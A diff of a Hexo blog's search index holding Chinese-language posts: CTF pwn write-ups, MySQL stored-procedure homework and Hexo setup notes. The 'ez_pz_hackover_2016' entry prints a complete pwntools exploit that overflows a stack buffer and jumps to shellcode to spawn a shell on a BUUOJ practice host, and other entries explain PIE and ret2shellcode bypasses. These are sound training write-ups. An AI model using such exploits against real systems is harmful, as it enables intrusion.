@@ -24,6 +24,18 @@
       </tags>
   </entry>
   <entry>
+    <title>ez_pz_hackover_2016</title>
+    <url>/2023/08/10/ez-pz-hackover-2016/</url>
+    <content><![CDATA[<p>例行检查，32位，开启了RELRO保护，二进制的保护机制看这里<br>由于没有开启nx保护，对于这题一开始想到的是利用写入shellcode来获取shell<br>试运行一下程序，看到程序一开始给我们了一个地址，随后让我们输入<br>32位ida载入，首先习惯性的shift+f12检索程序里的字符串，没有看到敏感的函数<br>从main函数开始看程序<br>一开始给我们输出了参数s的地址，之后利用fgets函数读入1023(0x3ff)长度的数据给s，s的大小是0x40c,没法造成溢出，之后将我们输入的数据利用strcmp函数跟crashme比较，如果不是这个字符串，就退出，<br>也就是我们应该输入 ‘crashme\x00’ 可以绕过这个if检查，之后执行vuln函数<br>往s参数里写入shellcode，执行vuln函数后让dest造成溢出，将返回地址修改为shellcode的地址去执行<br>完整exp<br>from pwn import *</p>
+<p>r&#x3D;remote(‘node3.buuoj.cn’,26843)<br>#p&#x3D;process(‘.&#x2F;ez_pz_hackover_2016’)<br>context.log_level&#x3D;’debug’</p>
+<p>#gdb.attach(p,’b <em>0x8048600’)<br>r.recvuntil(‘crash: ‘)<br>stack&#x3D;int(r.recv(10),16)<br>shellcode&#x3D;asm(shellcraft.sh())#利用pwntools自动生成shellcode<br>#print hex(stack)<br>payload&#x3D;’crashme\x00’+’a’</em>(0x16-8+4)+p32(stack-0x1c)+shellcode<br>r.sendline(payload)<br>#pause()</p>
+<p>r.interactive()</p>
+]]></content>
+      <tags>
+        <tag>pwn</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>fastjson</title>
     <url>/2023/10/27/fastjson/</url>
     <content><![CDATA[<p>package org.example;</p>
@@ -122,18 +134,6 @@
       </tags>
   </entry>
   <entry>
-    <title>ez_pz_hackover_2016</title>
-    <url>/2023/08/10/ez-pz-hackover-2016/</url>
-    <content><![CDATA[<p>例行检查，32位，开启了RELRO保护，二进制的保护机制看这里<br>由于没有开启nx保护，对于这题一开始想到的是利用写入shellcode来获取shell<br>试运行一下程序，看到程序一开始给我们了一个地址，随后让我们输入<br>32位ida载入，首先习惯性的shift+f12检索程序里的字符串，没有看到敏感的函数<br>从main函数开始看程序<br>一开始给我们输出了参数s的地址，之后利用fgets函数读入1023(0x3ff)长度的数据给s，s的大小是0x40c,没法造成溢出，之后将我们输入的数据利用strcmp函数跟crashme比较，如果不是这个字符串，就退出，<br>也就是我们应该输入 ‘crashme\x00’ 可以绕过这个if检查，之后执行vuln函数<br>往s参数里写入shellcode，执行vuln函数后让dest造成溢出，将返回地址修改为shellcode的地址去执行<br>完整exp<br>from pwn import *</p>
-<p>r&#x3D;remote(‘node3.buuoj.cn’,26843)<br>#p&#x3D;process(‘.&#x2F;ez_pz_hackover_2016’)<br>context.log_level&#x3D;’debug’</p>
-<p>#gdb.attach(p,’b <em>0x8048600’)<br>r.recvuntil(‘crash: ‘)<br>stack&#x3D;int(r.recv(10),16)<br>shellcode&#x3D;asm(shellcraft.sh())#利用pwntools自动生成shellcode<br>#print hex(stack)<br>payload&#x3D;’crashme\x00’+’a’</em>(0x16-8+4)+p32(stack-0x1c)+shellcode<br>r.sendline(payload)<br>#pause()</p>
-<p>r.interactive()</p>
-]]></content>
-      <tags>
-        <tag>pwn</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>hnk2022</title>
     <url>/2023/08/21/hnk2022/</url>
     <content><![CDATA[<p>[HNCTF 2022 Week1]ret2shellcode<br>1.checksec查看二进制文件<br>2.查找后门函数<br>objdump -t XXX               查看程序中使用到的函数<br>objdump -d XXX               查看程序中函数的汇编代码<br>objdump -d -M intel XXX        查看程序中函数的汇编代码，并且汇编代码是intel架构的<br>objdump -d -j .plt XXX          查看plt表<br>-j的参数有：.text  代码段<br>.const 只读数据段（有些编译器不使用此段，将只读数据并入.data段）<br>            .data  读写数据段<br>            .bss   bss段<br>3.发现read函数，存在栈溢出，s容量是256。然后将s复制到buff里，查找buff发现在bss段<br>但是文件存在nx保护。<br>4.同时有一个mprotect()函数，显示该段可以执行<br>mprotect()函数把自start开始的、长度为len的内存区的保护属性修改为prot指定的值。<br>int mprotect(const void *start, size_t len, int prot);<br>prot可以取以下几个值，并且可以用“|”将几个属性合起来使用：<br>1）PROT_READ：表示内存段内的内容可写；<br>2）PROT_WRITE：表示内存段内的内容可读；<br>3）PROT_EXEC：表示内存段中的内容可执行；<br>4）PROT_NONE：表示内存段中的内容根本没法访问。</p>
@@ -156,15 +156,6 @@
       </tags>
   </entry>
   <entry>
-    <title>pie绕过</title>
-    <url>/2023/08/21/pie%E7%BB%95%E8%BF%87/</url>
-    <content><![CDATA[<p>[NISACTF 2022]ezpie<br>已知：PIE保护——程序可能被加载到任意位置，所以位置是可变的。<br>程序返回了main的真实地址<br>存在后门函数shell<br>vuln()中的read 0x50u &gt;&gt; 28h，存在栈溢出<br>可以通过真实地址+偏移来计算任意函数真实地址<br>payload编写：溢出填充到返回地址前+后门函数真实地址（某函数真实地址+相对偏移量）<br>如果没有PIE——简单的ret2text，在vuln中的read处将程序执行流劫持到后门函数处即可。<br>然而存在PIE——所有的地址都是从一开始随机确定的，但是“相对偏移量保持不变”获取了main的真实地址——可以通过相对偏移量推出其他任意地址，然后就是正常的ret2text即可。</p>
-]]></content>
-      <tags>
-        <tag>pwn</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>7.10作业</title>
     <url>/2023/07/10/mybatis/</url>
     <content><![CDATA[<p>1检索所有的职工姓名与年薪<br>     public String toString() {<br>        return “User{“ +<br>                “, ename&#x3D;’” + ename + ‘&#39;‘<br>                “, salary&#x3D;” + salary +<br>                ‘}’+’\n’;<br>    }<br>##<select id="selectAll" resultType="org.example.pojo.User"><br>        select * from user<br>##</select><br><img src="/picture/%E5%9B%BE%E7%89%874.png"><br>2检索所有的工作和相应的部门编号<br><select id="selectAll" resultType="org.example.pojo.User"><br>        select job，deptno from emp where<br></select><br><img src="/picture/%E5%9B%BE%E7%89%875.png"><br>3检索工作是salesman的员工姓名<br><select id="selectById" resultMap="userResultMap"><br>        select * from emp where job&#x3D;’salesman’;<br></select><br><img src="/picture/%E5%9B%BE%E7%89%876.png"><br>4检索员工津贴comm为null或comm小于300的员工姓名和津贴值<br><select id="selectById" resultMap="userResultMap"><br>        select * from emp where comm &lt;300 or comm&#x3D;300 or comm&#x3D;null;<br></select><br><img src="/picture/%E5%9B%BE%E7%89%877.png"><br>5检索所有职员的姓名和所在部门名<br><select id="selectById" resultMap="userResultMap"><br>        select ename,deptno from emp;<br></select><br><img src="/picture/%E5%9B%BE%E7%89%878.png"><br>6检索在任何位置有字母“A”的员工姓名<br><select id="selectById" resultMap="userResultMap"><br>        select * from emp where ename like ‘%a%’;<br></select><br><img src="/picture/%E5%9B%BE%E7%89%879.png"><br>7向表eemp中插入至少5条员工记录<br><insert id="add" ><br>        insert into eemp(empno, ename,job,hiredate,salary,comm,deptno) values (1,’SMITH’,’manager’,’2019-2-1’,3300,300,2);<br></insert><br>&#x2F;&#x2F; 接收参数<br>             Integer empno&#x3D;1;<br>             String ename&#x3D;”liming”;<br>             String job&#x3D;”liming”;<br>             String hiredate&#x3D;”liming”;<br>             double salary&#x3D;100;<br>             double comm&#x3D;100;<br>             double deptno&#x3D;100;</p>
@@ -172,6 +163,15 @@
 ]]></content>
       <tags>
         <tag>web前端</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>pie绕过</title>
+    <url>/2023/08/21/pie%E7%BB%95%E8%BF%87/</url>
+    <content><![CDATA[<p>[NISACTF 2022]ezpie<br>已知：PIE保护——程序可能被加载到任意位置，所以位置是可变的。<br>程序返回了main的真实地址<br>存在后门函数shell<br>vuln()中的read 0x50u &gt;&gt; 28h，存在栈溢出<br>可以通过真实地址+偏移来计算任意函数真实地址<br>payload编写：溢出填充到返回地址前+后门函数真实地址（某函数真实地址+相对偏移量）<br>如果没有PIE——简单的ret2text，在vuln中的read处将程序执行流劫持到后门函数处即可。<br>然而存在PIE——所有的地址都是从一开始随机确定的，但是“相对偏移量保持不变”获取了main的真实地址——可以通过相对偏移量推出其他任意地址，然后就是正常的ret2text即可。</p>
+]]></content>
+      <tags>
+        <tag>pwn</tag>
       </tags>
   </entry>
   <entry>
@@ -275,6 +275,154 @@
 ]]></content>
       <tags>
         <tag>pwn</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>数据库</title>
+    <url>/2024/01/01/%E6%95%B0%E6%8D%AE%E5%BA%93/</url>
+    <content><![CDATA[<p>根据输入变量deptcode，编写代码块来获得雇员人数。</p>
+<pre class="line-numbers language-none"><code class="language-none">use example;
+set @deptcode &#x3D;6;
+set @personnum&#x3D;0;
+select count(*) into @personnum from emp where deptno&#x3D;@deptcode;
+select @personnum;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>请写一个存储过程：根据输入的参数员工编号得到该员工的姓名和工资。</p>
+<pre class="line-numbers language-none"><code class="language-none">drop procedure if exists select_person;
+DELIMITER &#x2F;&#x2F;
+create procedure select_person(IN empcode int,OUT empname varchar(20), out empsalary DECIMAL(20,2))
+begin
+select ename,sal into empname , empsalary from eemp where empno&#x3D; @empcode;
+end;
+&#x2F;&#x2F;
+DELIMITER ;
+set @empcode&#x3D;3;
+set @empname&#x3D;&#39;&#39;;
+set @empsalary&#x3D;0.0;
+call select_person(@empcode, @empname, @empsalary);
+select @empname, @empsalary;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>编写一个存储过程，根据输入的参数员工编号更改员工的工资:如果员工的工资大于100，则在原值的基础上增加100;如果工资为0或null，则将其设置为200。</p>
+<pre class="line-numbers language-none"><code class="language-none">drop procedure if exists supdate_sal;
+Delimiter &#x2F;&#x2F;
+Create procedure update_sal(in empcode int,out empsal float)
+Begin
+Declare salary float; 
+Select sal into salary from emp where empno&#x3D;empcode;
+If salary&gt;100 then update example.emp set sal&#x3D;sal+100 where empno&#x3D;empcode;
+End if;
+If salary&#x3D;0 or salary is null then update example.emp set sal&#x3D;200 where empno&#x3D;empcode;
+End if;
+Select sal into empsal from emp where empno&#x3D;empcode;
+End &#x2F;&#x2F;
+Delimiter ;
+Set @empcode&#x3D;4;
+Set @empsal&#x3D;0;
+Call update_sal(@empcode,@empsal);
+Select @empcode,@empsal;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>编写一个存储过程，根据输入的部门编号更改该部门所有员工的工资:如果员工的工资大于1000，则在原值的基础上增加10%;如果工资大于1500，则提高8%。(需要使用游标)<br>Drop procedure if exists sp_select_sal;</p>
+<pre class="line-numbers language-none"><code class="language-none">Drop procedure if exists sp_select_sal;
+DELIMITER &#x2F;&#x2F;
+CREATE PROCEDURE sp_select_sal(IN empcode INT)
+BEGIN
+    DECLARE salary DOUBLE;
+    DECLARE done INT DEFAULT 0;
+    DECLARE cur_sal CURSOR FOR SELECT sal FROM emp WHERE empno &#x3D; empcode;
+    DECLARE CONTINUE HANDLER FOR NOT FOUND SET done &#x3D; 1;
+    OPEN cur_sal;
+    REPEAT
+        FETCH cur_sal INTO salary;
+        IF NOT done THEN
+            IF salary &gt; 1000 AND salary &lt;&#x3D; 1500 THEN
+                UPDATE EXAMPLE.emp SET sal &#x3D; sal * 1.1 WHERE empno &#x3D; empcode;
+            ELSEIF salary &gt; 1500 THEN
+                UPDATE EXAMPLE.emp SET sal &#x3D; sal * 1.08 WHERE empno &#x3D; empcode;
+            END IF;
+        END IF;        
+    UNTIL done END REPEAT;
+    CLOSE cur_sal;
+END&#x2F;&#x2F;
+DELIMITER ;
+SET @deptcode&#x3D;2; 
+Select sum(sal) from emp where deptno&#x3D;@deptcode;
+CALL sp_select_sal(@deptcode);
+Select sum(sal) from emp where deptno&#x3D;@deptcode;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>请写一个存储过程，根据输入的部门编号，得到部门所有员工的姓名和工资。(用游标实现)</p>
+<pre class="line-numbers language-none"><code class="language-none">DELIMITER &#x2F;&#x2F;
+create procedure select_emps(in dcode int)
+begin
+DECLARE  empname varchar(20);
+DECLARE  empsalary float;
+DECLARE done INT DEFAULT 0;
+DECLARE  cur_emp cursor for select ename, sal from emp where deptno&#x3D; dcode;
+DECLARE CONTINUE HANDLER FOR NOT FOUND SET done &#x3D; 1;
+OPEN cur_emp;
+REPEAT
+FETCH cur_emp INTO empname, empsalary;
+IF NOT done THEN
+Select empname, empsalary;
+END IF;
+UNTIL done END REPEAT;
+CLOSE cur_emp;
+end;&#x2F;&#x2F;
+DELIMITER ;
+call select_emps(2);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>请写一个程序:根据输入的部门编号，得到这个部门所有员工的平均工资。(用游标)</p>
+<pre class="line-numbers language-none"><code class="language-none">drop procedure if exists sp_select_avgjob; 
+DELIMITER &#x2F;&#x2F;
+create procedure sp_select_avgjob(in dcode int)
+begin
+declare avgsalary float default 0;
+declare sum float default 0;
+declare n int default 0;
+declare done int default 0;
+declare cur_emp cursor for select Sal from emp where deptno&#x3D;dcode;
+DECLARE CONTINUE HANDLER FOR NOT FOUND SET done &#x3D; 1;
+open cur_emp;
+REPEAT
+fetch cur_emp into sum;
+IF NOT done THEN
+set n&#x3D;n+1;
+set avgsalary&#x3D;avgsalary+sum;
+end if;
+UNTIL done END REPEAT;
+CLOSE cur_emp;
+if n&gt;0 then
+set avgsalary&#x3D;avgsalary&#x2F;n;
+end if;
+select avgsalary;
+end;
+&#x2F;&#x2F;
+DELIMITER ;
+call sp_select_avgjob(2);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>请写一个程序:更改所有员工的津贴:如果员工的原津贴小于100;则改为200;如果空值则赋100元。(用游标)</p>
+<pre class="line-numbers language-none"><code class="language-none">drop procedure if exists  sp_update_sal;
+DELIMITER &#x2F;&#x2F;
+create procedure sp_update_sal()
+begin
+declare done int default 0;
+declare empcomm float;
+declare empname varchar(30);
+declare cur_emp cursor for select Comm,ename from emp;
+DECLARE CONTINUE HANDLER FOR NOT FOUND SET done &#x3D; 1;
+open cur_emp;
+REPEAT
+fetch cur_emp into empcomm,empname;
+IF NOT done THEN
+	if empcomm&lt;100 then 
+		update example.emp set Comm&#x3D;200 where ename&#x3D;empname;
+		elseif empcomm IS NULL then
+			update example.emp set Comm&#x3D;100 where ename&#x3D;empname;
+	end if;
+	 SELECT empname, empcomm; 
+end if;
+UNTIL done END REPEAT;
+CLOSE cur_emp;
+end;
+&#x2F;&#x2F;
+DELIMITER ;
+call sp_update_sal();
+select Comm from emp;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
+      <tags>
+        <tag>开发</tag>
       </tags>
   </entry>
   <entry>
@@ -390,15 +538,6 @@ return dp[n - 1];
       </tags>
   </entry>
   <entry>
-    <title>网站建立</title>
-    <url>/2023/06/21/%E7%BD%91%E7%AB%99%E5%BB%BA%E7%AB%8B%E5%BF%83%E5%BE%97/</url>
-    <content><![CDATA[<p>1.搭建前的软件准备（git，node）<br>Git：官网下载：<a href="https://git-scm.com/">https://git-scm.com/</a><br>Node.js 官网下载：<a href="http://nodejs.cn/">http://nodejs.cn/</a><br>Sublime<br>2. 安装hexo，完成简单本地页面展示<br>进入cmd窗口输入指令：<br>npm install -g hexo-cli<br>初始化<br>hexo init<br>查看是否能启动成功<br>hexo s<br>3.将Hexo部署到Github<br>Github创建个人仓库<br>首先，需要有一个github账号。登上账号后建一个仓库：仓库名为你的用户名.github.io，<br>举例如下：<br>创建一个和你用户名相同的仓库，后面加.github.io，<br>只有这样，将来要部署到GitHub的时候，才会被识别，也就是xxxx.github.io，其中xxx就是你注册GitHub的用户名.<br>生成ssh添加到Github<br>在Github上创建仓库完成之后，需要设置ssh免密登录<br>进行部署<br>这一步，我们就可以将hexo和GitHub关联起来，也就是将hexo生成的文章部署到GitHub上，打开站点配置文件 _config.yml，翻到最后，修改为<br>YourgithubName就是你的GitHub账户</p>
-]]></content>
-      <tags>
-        <tag>web前端</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>第四周</title>
     <url>/2023/10/10/%E7%AC%AC%E5%9B%9B%E5%91%A8/</url>
     <content><![CDATA[<p>void merge(int* nums1, int nums1Size, int m, int* nums2, int nums2Size, int n) {<br>    int i &#x3D; m - 1;  &#x2F;&#x2F; 初始化指针 i，指向 nums1 的末尾<br>    int j &#x3D; n - 1;  &#x2F;&#x2F; 初始化指针 j，指向 nums2 的末尾<br>    int k &#x3D; m + n - 1;  &#x2F;&#x2F; 初始化指针 k，指向合并后的数组的末尾</p>
@@ -450,6 +589,15 @@ return j;
 ]]></content>
       <tags>
         <tag>开发</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>网站建立</title>
+    <url>/2023/06/21/%E7%BD%91%E7%AB%99%E5%BB%BA%E7%AB%8B%E5%BF%83%E5%BE%97/</url>
+    <content><![CDATA[<p>1.搭建前的软件准备（git，node）<br>Git：官网下载：<a href="https://git-scm.com/">https://git-scm.com/</a><br>Node.js 官网下载：<a href="http://nodejs.cn/">http://nodejs.cn/</a><br>Sublime<br>2. 安装hexo，完成简单本地页面展示<br>进入cmd窗口输入指令：<br>npm install -g hexo-cli<br>初始化<br>hexo init<br>查看是否能启动成功<br>hexo s<br>3.将Hexo部署到Github<br>Github创建个人仓库<br>首先，需要有一个github账号。登上账号后建一个仓库：仓库名为你的用户名.github.io，<br>举例如下：<br>创建一个和你用户名相同的仓库，后面加.github.io，<br>只有这样，将来要部署到GitHub的时候，才会被识别，也就是xxxx.github.io，其中xxx就是你注册GitHub的用户名.<br>生成ssh添加到Github<br>在Github上创建仓库完成之后，需要设置ssh免密登录<br>进行部署<br>这一步，我们就可以将hexo和GitHub关联起来，也就是将hexo生成的文章部署到GitHub上，打开站点配置文件 _config.yml，翻到最后，修改为<br>YourgithubName就是你的GitHub账户</p>
+]]></content>
+      <tags>
+        <tag>web前端</tag>
       </tags>
   </entry>
 </search>
